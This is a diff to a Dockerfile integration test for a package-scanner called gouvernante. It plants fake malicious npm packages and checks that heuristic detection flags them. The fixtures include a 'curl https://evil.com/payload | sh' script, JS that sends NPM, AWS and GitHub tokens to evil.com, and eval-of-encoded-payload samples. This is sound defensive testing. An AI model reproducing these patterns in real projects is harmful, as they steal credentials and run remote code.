@@ -50,12 +50,44 @@ RUN mkdir -p /root/.nvm/versions/node/v20.0.0/lib/node_modules/axios && \
 RUN mkdir -p /root/.npm/_cacache/index-v5/ab/cd && \
     echo '{"key":"make-fetch-happen:request-cache:https://registry.npmjs.org/axios/-/axios-1.14.1.tgz","integrity":"sha512-fake","time":1234}' > /root/.npm/_cacache/index-v5/ab/cd/fake-blob
 
-# Run the scan and capture exit code (exit 2 = findings, which is expected).
+# 6. Plant heuristic test fixtures.
+#    eval-decode: JS file with eval(atob(...)).
+#    pipe-shell: shell script with curl | sh.
+#    postinstall-exec: package.json with suspicious lifecycle script.
+#    env-harvest: JS file harvesting 3+ secret env vars with network call.
+#    hex-exec: JS file with long hex literal and eval.
+#    clean-pkg: benign package that should NOT trigger any heuristic.
+RUN mkdir -p /test/heuristic/node_modules/eval-decode && \
+    echo '{"name":"eval-decode","version":"1.0.0"}' > /test/heuristic/node_modules/eval-decode/package.json && \
+    echo 'eval(atob("d2hvYW1p"))' > /test/heuristic/node_modules/eval-decode/index.js
+
+RUN mkdir -p /test/heuristic/node_modules/pipe-shell && \
+    echo '{"name":"pipe-shell","version":"1.0.0"}' > /test/heuristic/node_modules/pipe-shell/package.json && \
+    printf '#!/bin/sh\ncurl https://evil.com/payload | sh\n' > /test/heuristic/node_modules/pipe-shell/setup.sh
+
+RUN mkdir -p /test/heuristic/node_modules/postinstall-exec && \
+    echo '{"name":"postinstall-exec","version":"1.0.0","scripts":{"postinstall":"node -e \"require(./x)\""}}' > /test/heuristic/node_modules/postinstall-exec/package.json
+
+RUN mkdir -p /test/heuristic/node_modules/env-harvest && \
+    echo '{"name":"env-harvest","version":"1.0.0"}' > /test/heuristic/node_modules/env-harvest/package.json && \
+    printf 'const a = process.env.NPM_TOKEN;\nconst b = process.env.AWS_SECRET_ACCESS_KEY;\nconst c = process.env.GITHUB_TOKEN;\nfetch("https://evil.com/collect", {body: JSON.stringify({a,b,c})});\n' > /test/heuristic/node_modules/env-harvest/index.js
+
+RUN mkdir -p /test/heuristic/node_modules/hex-exec && \
+    echo '{"name":"hex-exec","version":"1.0.0"}' > /test/heuristic/node_modules/hex-exec/package.json && \
+    printf 'var payload = "%s"; eval(payload);\n' "$(printf '4142434445464748%.0s' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15)" > /test/heuristic/node_modules/hex-exec/index.js
+
+RUN mkdir -p /test/heuristic/node_modules/clean-pkg && \
+    echo '{"name":"clean-pkg","version":"1.0.0","scripts":{"test":"node test.js"}}' > /test/heuristic/node_modules/clean-pkg/package.json && \
+    echo 'console.log("hello world");' > /test/heuristic/node_modules/clean-pkg/index.js
+
+# ===============================
+# Run rule-based scan (exit 2 = findings, which is expected).
+# ===============================
 RUN gouvernante -recursive -rules /test/rules -dir /test/project -host -output /tmp/report.txt || true
 
-# Verify results.
+# Verify rule-based results.
 RUN set -e && \
-    echo "--- Checking report for expected findings ---" && \
+    echo "--- Checking rule-based report for expected findings ---" && \
     grep -q "axios@0.30.4" /tmp/report.txt || { echo "FAIL: missing lockfile axios finding"; exit 1; } && \
     grep -q "plain-crypto-js" /tmp/report.txt || { echo "FAIL: missing dropper finding"; exit 1; } && \
     grep -q "\[FOUND\].*ld.py" /tmp/report.txt || { echo "FAIL: missing host indicator ld.py"; exit 1; } && \
@@ -65,7 +97,47 @@ RUN set -e && \
     grep -q "hash confirmed" /tmp/report.txt || { echo "FAIL: missing hash confirmed note for hash-match-test.bin"; exit 1; } && \
     grep -q "\[FOUND\].*axios.*0.30.4" /tmp/report.txt || { echo "FAIL: missing node_modules axios"; exit 1; } && \
     grep -q "\[FOUND\].*plain-crypto-js" /tmp/report.txt || { echo "FAIL: missing node_modules dropper"; exit 1; } && \
-    echo "--- Full report ---" && \
-    cat /tmp/report.txt && \
+    echo "RULE-BASED TESTS PASSED"
+
+# ===============================
+# Run heuristic scan (exit 2 = findings expected).
+# ===============================
+RUN gouvernante -heuristic -dir /test/heuristic -output /tmp/heuristic-report.txt || true
+
+# Verify heuristic results.
+RUN set -e && \
+    echo "--- Checking heuristic report for expected findings ---" && \
+    grep -q "HEUR-EVAL-DECODE" /tmp/heuristic-report.txt || { echo "FAIL: missing HEUR-EVAL-DECODE"; exit 1; } && \
+    grep -q "eval-decode" /tmp/heuristic-report.txt || { echo "FAIL: missing eval-decode package"; exit 1; } && \
+    grep -q "HEUR-PIPE-SHELL" /tmp/heuristic-report.txt || { echo "FAIL: missing HEUR-PIPE-SHELL"; exit 1; } && \
+    grep -q "pipe-shell" /tmp/heuristic-report.txt || { echo "FAIL: missing pipe-shell package"; exit 1; } && \
+    grep -q "HEUR-POSTINSTALL-EXEC" /tmp/heuristic-report.txt || { echo "FAIL: missing HEUR-POSTINSTALL-EXEC"; exit 1; } && \
+    grep -q "postinstall-exec" /tmp/heuristic-report.txt || { echo "FAIL: missing postinstall-exec package"; exit 1; } && \
+    grep -q "HEUR-ENV-HARVEST" /tmp/heuristic-report.txt || { echo "FAIL: missing HEUR-ENV-HARVEST"; exit 1; } && \
+    grep -q "env-harvest" /tmp/heuristic-report.txt || { echo "FAIL: missing env-harvest package"; exit 1; } && \
+    grep -q "HEUR-HEX-EXEC" /tmp/heuristic-report.txt || { echo "FAIL: missing HEUR-HEX-EXEC"; exit 1; } && \
+    grep -q "hex-exec" /tmp/heuristic-report.txt || { echo "FAIL: missing hex-exec package"; exit 1; } && \
+    echo "HEURISTIC DETECTION TESTS PASSED"
+
+# Verify clean package did NOT trigger any heuristic finding.
+RUN set -e && \
+    if grep -q "clean-pkg" /tmp/heuristic-report.txt; then \
+        echo "FAIL: clean-pkg should not appear in heuristic findings"; exit 1; \
+    fi && \
+    echo "HEURISTIC FALSE-POSITIVE TEST PASSED"
+
+# Run heuristic scan with JSON output and verify structure.
+RUN gouvernante -heuristic -dir /test/heuristic -json -output /tmp/heuristic-report.json || true
+
+RUN set -e && \
+    grep -q '"rule_id"' /tmp/heuristic-report.json || { echo "FAIL: missing rule_id in JSON"; exit 1; } && \
+    grep -q '"type": "heuristic"' /tmp/heuristic-report.json || { echo "FAIL: missing heuristic type in JSON"; exit 1; } && \
+    grep -q '"findings"' /tmp/heuristic-report.json || { echo "FAIL: missing findings key in JSON"; exit 1; } && \
+    echo "HEURISTIC JSON OUTPUT TEST PASSED"
+
+# Print reports and final status.
+RUN echo "--- Rule-based report ---" && cat /tmp/report.txt && \
+    echo "" && \
+    echo "--- Heuristic report ---" && cat /tmp/heuristic-report.txt && \
     echo "" && \
     echo "ALL INTEGRATION TESTS PASSED"
